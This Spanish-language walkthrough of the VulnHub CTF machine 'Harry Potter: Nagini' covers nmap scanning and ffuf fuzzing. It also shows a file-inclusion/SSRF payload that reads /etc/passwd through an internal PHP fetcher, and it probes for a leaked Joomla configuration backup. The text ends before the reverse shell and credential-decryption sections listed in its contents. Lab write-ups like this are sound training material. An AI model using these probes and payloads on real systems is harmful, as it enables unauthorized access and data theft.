<h1 align="center">
<br>
  <img src="https://static.wikia.nocookie.net/harrypotter/images/7/70/Nagini_PM.png/revision/latest?cb=20161124073206" alt="Front-End Checklist" width="200">
  <br>
  Harry Potter: Nagini
  <br>
</h1>

<h4 align="center">Maquina creada por <img src="https://img.icons8.com/android/344/twitter.png" alt="Front-End Checklist" width="12">@time4ster</h4>
<h4 align="center">Aquí puedes descargarte la <a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">página web</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Fuzz]()
  - [Curl]()
  - [Web]()
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [SSRF]()
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Gopherus]()
- [Post-explotación](#post-explotación)
  - [Joomla]()
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
    - [Reverse Shell]()
  - [Recopilación de información](#recopilación-de-información-1)
  - [Movimiento Lateral]()
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [linPEAS]()
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [Mozilla decrypt]()
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.221.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.221.8```

### Fuzz

Para fuzzear la web usaremos este comando con una wordlist que tengamos:

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.8/FUZZ```

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.8/joomla/FUZZ```

Para ver solo archivos con extensión .txt,.php,.html

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.8/FUZZ -e .txt,.html,.php -ic```

> -ic para quitar basurilla del fuzz

Encontramos un .txt llamado **note**:

```
Hello developers!!


	I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
	All developers are requested to visit the server regularly for checking latest announcements.


	Regards,
	site_amdin
```

### Curl

Con el curl que tengo instalado no he podido leer la web HTTP3, asi que me he instalado el curl desde esta [página web](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version).

He tenido algunos errores y para solucionarlo he utilizado esta [página web](https://stackoverflow.com/questions/44303915/no-default-toolchain-configured-after-installing-rustup) y este comando ```sudo pacman -S cmake```

Después de esto seguiremos estos comandos:

```
cd src
./curl --http3 https://quic.nagini.hogwarts
```
> 192.168.221.8 quic.nagini.hogwarts en el archivo /etc/hosts

En esa página web leemos esto:

```
Greetings Developers!!

                I am having two announcements that I need to share with you:

                1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
                2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


                Regards,
                site_admin
```
### Web

Entramos en la página web que hemos recopilado anteriormente y probando hemos comprobado que tenemos un file inclusion:
```http://quic.nagini.hogwarts/internalResourceFeTcher.php?url=file:/etc/passwd```

Además también recopilamos que podria haber un archivo .bak, así que como sabemos que joomla tiene un **configuration.php** probaremos ese archivo pero con el **.bak**

En este archivo hemos encontrado que un usuario es **goblin**

Después de mucha búsqueda y de alguna **hint** que me han dado, he encontrao una vulnerabilidad de **SSRF**

> SSRF(Server-side Request Forgery) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del
> lado del servidor a realizar solicitudes HTTP a un dominio arbitario de la elección del atacante.


